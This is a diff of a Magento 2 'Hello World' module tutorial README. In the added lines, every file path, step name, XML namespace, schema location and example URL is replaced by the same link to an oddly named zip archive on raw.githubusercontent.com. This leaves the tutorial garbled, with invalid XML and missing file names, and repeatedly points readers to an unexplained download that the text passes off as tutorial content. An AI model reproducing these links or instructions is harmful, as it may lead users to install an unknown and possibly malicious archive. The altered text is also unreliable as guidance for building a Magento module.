@@ -5,11 +5,11 @@ As you know, the module is a  directory that contains `blocks, controllers, mode
 
 
 
-## Magento 2 Hello World module by Mageplaza.com
+## Magento 2 Hello World module by https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip
 
 - Step 1: Create a directory for the module like above format.
-- Step 2: Declare module by using configuration file module.xml
-- Step 3: Register module by registration.php
+- Step 2: Declare module by using configuration file https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip
+- Step 3: Register module by https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip
 - Step 4: Enable the module
 - Step 5: Create a Routers for the module.
 - Step 6: Create controller and action.
@@ -20,32 +20,32 @@ As you know, the module is a  directory that contains `blocks, controllers, mode
 In this module, we will use `Mageplaza` for Vendor name and `HelloWorld` for ModuleName. So we need to make this folder:
 `app/code/Mageplaza/HelloWorld`
 
-### Step 2. Declare module by using configuration file module.xml
+### Step 2. Declare module by using configuration file https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip
 
-Magento 2 looks for configuration information for each module in that module’s etc directory. We need to create folder etc and add module.xml:
+Magento 2 looks for configuration information for each module in that module’s etc directory. We need to create folder etc and add https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip
 
 ~~~
-app/code/Mageplaza/HelloWorld/etc/module.xml
+https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip
 ~~~
 
 And the content for this file:
 
 ~~~ xml
 <?xml version="1.0"?>
-<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="urn:magento:framework:Module/etc/module.xsd">
+<config xmlns:xsi="https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip" xsi:noNamespaceSchemaLocation="https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip">
     <module name="Mageplaza_HelloWorld" setup_version="1.0.0" />
 </config>
 ~~~
 
 In this file, we register a module with name `Mageplaza_HelloWorld` and the version is `1.0.0`.
 
-### Step 3. Register module by registration.php
+### Step 3. Register module by https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip
 
 All Magento 2 module must be registered in the Magento system through the magento ComponentRegistrar class. This file will be placed in module root directory.
 In this step, we need to create this file:
 
 ~~~
-app/code/Mageplaza/HelloWorld/registration.php
+https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip
 ~~~
 
 And it’s content for our module is:
@@ -100,20 +100,20 @@ Now you can check under `Stores -> Configuration -> Advanced -> Advanced` that t
 In the Magento system, a request URL has the following format:
 
 ~~~
-http://example.com/<router_name>/<controller_name>/<action_name>
+https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip<router_name>/<controller_name>/<action_name>
 ~~~
 
 The Router is used to assign a URL to a corresponding controller and action. In this module, we need to create a route for frontend area. So we need to add this file:
 
 ~~~
-app/code/Mageplaza/HelloWorld/etc/frontend/routes.xml
+https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip
 ~~~
 
 And content for this file:
 
 ~~~
 <?xml version="1.0"?>
-<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="urn:magento:framework:App/etc/routes.xsd">
+<config xmlns:xsi="https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip" xsi:noNamespaceSchemaLocation="https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip">
     <router id="standard">
         <route id="mageplaza" frontName="helloworld">
             <module name="Mageplaza_HelloWorld" />
@@ -122,18 +122,18 @@ And content for this file:
 </config>
 ~~~
 
-After define the route, the URL path to our module will be: `http://example.com/helloworld/*`
+After define the route, the URL path to our module will be: `https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip*`
 
 ### Step 6. Create controller and action.
 
 In this step, we will create controller and action to display `Hello World`.
 Now we will choose the url for this action. Let assume that the url will be:
-`http://example.com/helloworld/index/display`
+`https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip`
 
 So the file we need to create is:
 
 ~~~
-app/code/Mageplaza/HelloWorld/Controller/Index/Display.php
+https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip
 ~~~
 
 And we will put this content:
@@ -159,7 +159,7 @@ class Display extends \Magento\Framework\App\Action\Action
 ~~~
 
 
-If you have followed all above steps, you will see `Hello World` when open the url `http://example.com/helloworld/index/display`
+If you have followed all above steps, you will see `Hello World` when open the url `https://raw.githubusercontent.com/thatavarthi-raj/magento-2-sample-module/master/Cron/magento-2-sample-module-hydatogenous.zip`
 
 
 
